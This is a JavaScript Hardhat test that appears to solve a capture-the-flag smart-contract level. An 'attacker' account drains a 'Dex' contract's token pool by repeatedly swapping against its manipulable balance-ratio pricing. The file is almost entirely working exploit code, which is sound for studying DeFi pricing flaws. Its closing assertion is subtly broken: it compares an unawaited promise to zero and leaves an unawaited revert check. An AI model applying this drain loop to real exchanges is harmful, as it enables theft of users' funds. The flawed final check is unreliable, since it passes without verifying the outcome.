const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Dex', function () {
  let deployer, attacker;

  before(async function () {
    [deployer, attacker] = await ethers.getSigners();
    const Dex = await ethers.getContractFactory('Dex', deployer);
    const SwappableToken = await ethers.getContractFactory('SwappableToken', deployer);

    this.dex = await Dex.deploy();
    this.token1 = await SwappableToken.deploy(this.dex.address, 'token1', 'tk1', 110);
    this.token2 = await SwappableToken.deploy(this.dex.address, 'token2', 'tk2', 110);
    await this.token1.transfer(attacker.address, 10);
    await this.token2.transfer(attacker.address, 10);
    await this.token1.transfer(this.dex.address, 100);
    await this.token2.transfer(this.dex.address, 100);
    await this.dex.setTokens(this.token1.address, this.token2.address);

    expect(await this.token1.balanceOf(attacker.address)).to.be.eq(10);
    expect(await this.token1.balanceOf(this.dex.address)).to.be.eq(100);
    expect(await this.token2.balanceOf(attacker.address)).to.be.eq(10);
    expect(await this.token2.balanceOf(this.dex.address)).to.be.eq(100);
  });

  it('Drains Dex', async function () {
    const tokenAdd1 = this.token1.address;
    const tokenAdd2 = this.token2.address;
    const dexAdd = this.dex.address;
    await this.dex.connect(attacker).approve(dexAdd, 1000);

    while ((await this.dex.balanceOf(tokenAdd1, dexAdd)) != 0 && (await this.dex.balanceOf(tokenAdd2, dexAdd)) != 0) {
      const attackerToken1Balance = await this.dex.balanceOf(tokenAdd1, attacker.address);
      const attackerToken2Balance = await this.dex.balanceOf(tokenAdd2, attacker.address);
      console.log('Current amount of token1:', attackerToken1Balance);
      console.log('Current amount of token2:', attackerToken2Balance);
      console.log('-------------------------');
      if (attackerToken1Balance > attackerToken2Balance) {
        let price = await this.dex.getSwapPrice(tokenAdd1, tokenAdd2, attackerToken1Balance);
        if (price > (await this.dex.balanceOf(tokenAdd2, dexAdd))) {
          price = Math.floor(((await this.dex.balanceOf(tokenAdd2, dexAdd)) * attackerToken1Balance) / price);
        }
        await this.dex.connect(attacker).swap(tokenAdd1, tokenAdd2, Math.min(price, attackerToken1Balance));
      } else {
        let price = await this.dex.getSwapPrice(tokenAdd2, tokenAdd1, attackerToken2Balance);
        if (price > (await this.dex.balanceOf(tokenAdd1, dexAdd))) {
          price = Math.floor(((await this.dex.balanceOf(tokenAdd1, dexAdd)) * attackerToken2Balance) / price);
        }
        await this.dex.connect(attacker).swap(tokenAdd2, tokenAdd1, Math.min(price, attackerToken2Balance));
      }
    }

    if (this.dex.balanceOf(tokenAdd1, dexAdd) == 0) {
      expect(this.dex.getSwapPrice(tokenAdd1, tokenAdd2, 1)).to.be.reverted;
    } else {
      expect(this.dex.getSwapPrice(tokenAdd2, tokenAdd1, 1)).to.be.reverted;
    }
  });
});
